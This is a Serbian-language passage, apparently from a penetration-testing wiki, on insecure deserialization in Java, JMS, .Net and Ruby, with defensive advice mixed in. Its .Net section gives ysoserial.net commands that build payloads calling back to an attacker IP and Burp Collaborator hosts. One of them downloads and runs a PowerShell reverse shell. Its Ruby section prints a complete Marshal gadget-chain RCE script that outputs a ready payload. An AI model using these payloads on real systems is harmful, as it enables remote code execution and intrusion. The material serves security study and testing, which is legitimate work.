Prepišite **`resolveClass()`** metod kako biste ograničili deserijalizaciju samo na dozvoljene klase. Ovo sprečava deserijalizaciju bilo koje klase osim onih eksplicitno dozvoljenih, kao u sledećem primeru koji ograničava deserijalizaciju samo na klasu `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Korišćenje Java agenta za poboljšanje bezbednosti** pruža alternativno rešenje kada modifikacija koda nije moguća. Ovaj metod se uglavnom primenjuje za **crnu listu štetnih klasa**, korišćenjem JVM parametra:
```
-javaagent:name-of-agent.jar
```
Prati način za dinamičko obezbeđivanje deserijalizacije, idealno za okruženja gde su odmahšnje promene koda nepraktične.

Pogledajte primer u [rO0 od Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementiranje filtera za serijalizaciju**: Java 9 je uveo filtere za serijalizaciju putem **`ObjectInputFilter`** interfejsa, pružajući moćan mehanizam za specificiranje kriterijuma koje serijalizovani objekti moraju ispuniti pre deserijalizacije. Ovi filteri mogu biti primenjeni globalno ili po toku, nudeći granularnu kontrolu nad procesom deserijalizacije.

Da biste koristili filtere za serijalizaciju, možete postaviti globalni filter koji se primenjuje na sve operacije deserijalizacije ili ga konfigurisati dinamički za specifične tokove. Na primer:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Iskorišćavanje Spoljnih Biblioteka za Unapređenu Bezbednost**: Biblioteke poput **NotSoSerial**, **jdeserialize** i **Kryo** nude napredne funkcije za kontrolisanje i praćenje Java deserijalizacije. Ove biblioteke mogu pružiti dodatne slojeve bezbednosti, poput beleženja ili crnog liste klasa, analiziranja serijalizovanih objekata pre deserijalizacije i implementiranja prilagođenih strategija serijalizacije.

* **NotSoSerial** presreće procese deserijalizacije kako bi sprečio izvršavanje nepoverljivog koda.
* **jdeserialize** omogućava analizu serijalizovanih Java objekata bez njihove deserijalizacije, pomažući u identifikaciji potencijalno zlonamernog sadržaja.
* **Kryo** je alternativni okvir za serijalizaciju koji naglašava brzinu i efikasnost, nudeći konfigurabilne strategije serijalizacije koje mogu unaprediti bezbednost.

### Reference

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Razgovor o deserijalizaciji i ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Razgovor o gadgetinspector-u: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) i slajdovi: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec rad: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java i .Net JSON deserijalizacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** razgovor: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE-ovi deserijalizacije: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Pronađite šta je **JNDI Injection, kako zloupotrebiti putem RMI, CORBA & LDAP i kako iskoristiti log4shell** (i primer ove ranjivosti) na sledećoj stranici:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API je Java API za poruke orijentisan na poruke za slanje poruka između dva ili više klijenata. To je implementacija za rešavanje problema proizvođač–potrošač. JMS je deo Java Platforme, Enterprise Edition (Java EE), i definisan je specifikacijom razvijenom u Sun Microsystems-u, ali koju je od tada vodio Java Community Process. To je standard za poruke koji omogućava komponentama aplikacije zasnovanim na Java EE da kreiraju, šalju, primaju i čitaju poruke. Omogućava komunikaciju između različitih komponenti distribuirane aplikacije da bude labavo povezana, pouzdana i asinhrona. (Iz [Vikipedije](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Proizvodi

Postoji nekoliko proizvoda koji koriste ovaj middleware za slanje poruka:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (311).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1053).png>)

### Eksploatacija

Dakle, u osnovi postoji **niz usluga koje koriste JMS na opasan način**. Stoga, ako imate **dovoljno privilegija** da šaljete poruke ovim uslugama (obično će vam biti potrebne validne akreditacije), možda ćete moći da pošaljete **zlonamerne objekte serijalizovane koji će biti deserijalizovani od strane potrošača/pretplatnika**.\
To znači da će svi **klijenti koji koriste tu poruku biti zaraženi**.

Trebalo bi da zapamtite da čak i ako je usluga ranjiva (zbog nesigurne deserijalizacije korisničkog unosa), i dalje morate pronaći validne gedžete za iskorišćavanje ranjivosti.

Alat [JMET](https://github.com/matthiaskaiser/jmet) je kreiran da **poveže i napadne ove usluge slanjem nekoliko zlonamernih objekata serijalizovanih korišćenjem poznatih gedžeta**. Ovi eksploati će raditi ako je usluga i dalje ranjiva i ako se neki od korišćenih gedžeta nalazi unutar ranjive aplikacije.

### Reference

* JMET razgovor: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdovi: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

U kontekstu .Net-a, eksploatacije deserijalizacije funkcionišu na način sličan onima pronađenim u Javi, gde se gedžeti iskorišćavaju kako bi se izvršio određeni kod tokom deserijalizacije objekta.
### Fingerprint

#### WhiteBox

Izvorni kod treba da se pregleda radi pojavljivanja:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Fokus treba da bude na serijskim alatima koji dozvoljavaju da tip bude određen promenljivom pod kontrolom korisnika.

#### BlackBox

Pretraga treba da cilja na Base64 kodiranu nisku **AAEAAAD/////** ili bilo koji sličan obrazac koji bi mogao da prođe kroz deserijalizaciju na serverskoj strani, dajući kontrolu nad tipom koji će biti deserijalizovan. Ovo može uključivati, ali nije ograničeno na, **JSON** ili **XML** strukture koje sadrže `TypeObject` ili `$type`.

### ysoserial.net

U ovom slučaju možete koristiti alat [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kako biste **kreirali eksploate za deserijalizaciju**. Nakon preuzimanja git repozitorijuma, trebalo bi da **kompajlirate alat** koristeći na primer Visual Studio.

Ako želite da saznate **kako ysoserial.net kreira svoj eksploat** možete [**proveriti ovu stranicu gde je objašnjen ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Glavne opcije **ysoserial.net** su: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** se koristi da se naznači gadžet za zloupotrebu (naznačite klasu/funkciju koja će biti zloupotrebljena tokom deserijalizacije radi izvršavanja komandi).
* **`--formatter`**, koristi se da se naznači metoda za serijalizaciju eksploata (treba da znate koju biblioteku koristi serverska strana za deserijalizaciju payloada i koristite istu za serijalizaciju).
* **`--output`** se koristi da se naznači da li želite eksploat u **sirovom** ili **Base64** kodiranom obliku. _Imajte na umu da će **ysoserial.net** **enkodirati** payload koristeći **UTF-16LE** (kodiranje koje se podrazumevano koristi na Windows-u), pa ako dobijete sirovu verziju i samo je enkodirate sa linux konzole, možda ćete imati nekih **problema sa kompatibilnošću kodiranja** koji će sprečiti eksploat da pravilno funkcioniše (u HTB JSON kutiji payload je radio i u UTF-16LE i ASCII, ali to ne znači da će uvek raditi)._
* **`--plugin`** ysoserial.net podržava dodatke za kreiranje **eksploata za specifične okvire** kao što je ViewState

#### Više parametara ysoserial.net

* `--minify` će pružiti **manji payload** (ako je moguće)
* `--raf -f Json.Net -c "bilo šta"` Ovo će naznačiti sve gadžete koji se mogu koristiti sa navedenim formatterom (`Json.Net` u ovom slučaju)
* `--sf xml` možete **naznačiti gadžet** (`-g`) i ysoserial.net će tražiti formatare koji sadrže "xml" (bez obzira na velika/mala slova)

**Primeri ysoserial.net** za kreiranje eksploata:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** takođe ima **vrlo interesantan parametar** koji pomaže da bolje razumete kako svaki eksploit funkcioniše: `--test`\
Ako navedete ovaj parametar, **ysoserial.net** će **pokušati** eksploit lokalno, tako da možete testirati da li će vaš payload pravilno raditi.\
Ovaj parametar je koristan jer ako pregledate kod, pronaći ćete delove koda poput sledećeg (iz [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Ovo znači da bi testiranje eksploatacije kod pozvalo [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
U **prethodnom kodu postoji ranjivost na kreiranu eksploataciju**. Dakle, ako pronađete nešto slično u .Net aplikaciji, to znači da je ta aplikacija verovatno ranjiva.\
Stoga **parametar `--test`** nam omogućava da razumemo **koji delovi koda su ranjivi** na eksploataciju deserijalizacije koju može da kreira **ysoserial.net**.

### ViewState

Pogledajte [ovaj POST o **kako pokušati eksploatisati parametar \_\_ViewState u .Net-u**](exploiting-\_\_viewstate-parameter.md) da biste **izvršili proizvoljni kod**. Ako **već znate tajne** koje koristi žrtvena mašina, [**pročitajte ovaj post da biste znali kako izvršiti kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevencija

Da biste umanjili rizike povezane sa deserijalizacijom u .Net-u:

* **Izbegavajte dozvoljavanje tokova podataka da definišu svoje tipove objekata.** Koristite `DataContractSerializer` ili `XmlSerializer` kada je moguće.
* **Za `JSON.Net`, postavite `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Izbegavajte korišćenje `JavaScriptSerializer` sa `JavaScriptTypeResolver`-om.**
* **Ograničite tipove koji mogu biti deserijalizovani**, razumevajući inherentne rizike sa .Net tipovima, kao što je `System.IO.FileInfo`, koji može da modifikuje osobine serverskih fajlova, potencijalno dovodeći do napada uskraćivanjem usluge.
* **Budite oprezni sa tipovima koji imaju rizične osobine**, poput `System.ComponentModel.DataAnnotations.ValidationException` sa svojom `Value` osobinom, koja može biti iskorišćena.
* **Sigurno kontrolišite instanciranje tipova** da biste sprečili napadače da utiču na proces deserijalizacije, čineći čak i `DataContractSerializer` ili `XmlSerializer` ranjivim.
* **Implementirajte kontrole belih lista** koristeći prilagođeni `SerializationBinder` za `BinaryFormatter` i `JSON.Net`.
* **Budite informisani o poznatim nesigurnim deserijalizacionim gedžetima** unutar .Net-a i obezbedite da deserijalizatori ne instanciraju takve tipove.
* **Izolujte potencijalno rizičan kod** od koda sa internet pristupom kako biste izbegli izlaganje poznatih gedžeta, poput `System.Windows.Data.ObjectDataProvider` u WPF aplikacijama, neosiguranim izvorima podataka.

### **Reference**

* Java i .Net JSON deserijalizacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacija: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

U Ruby-u, serijalizacija se olakšava pomoću dve metode unutar biblioteke **marshal**. Prva metoda, poznata kao **dump**, koristi se za transformisanje objekta u niz bajtova. Ovaj proces se naziva serijalizacija. Nasuprot tome, druga metoda, **load**, koristi se za vraćanje niza bajtova u objekat, proces poznat kao deserijalizacija.

Za obezbeđivanje serijalizovanih objekata, **Ruby koristi HMAC (Hash-Based Message Authentication Code)**, obezbeđujući integritet i autentičnost podataka. Ključ koji se koristi u tu svrhu čuva se na jednom od nekoliko mogućih lokacija:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generička deserijalizacija u RCE lanac gedžeta (više informacija na** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Drugi RCE lanac za iskorišćavanje Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)
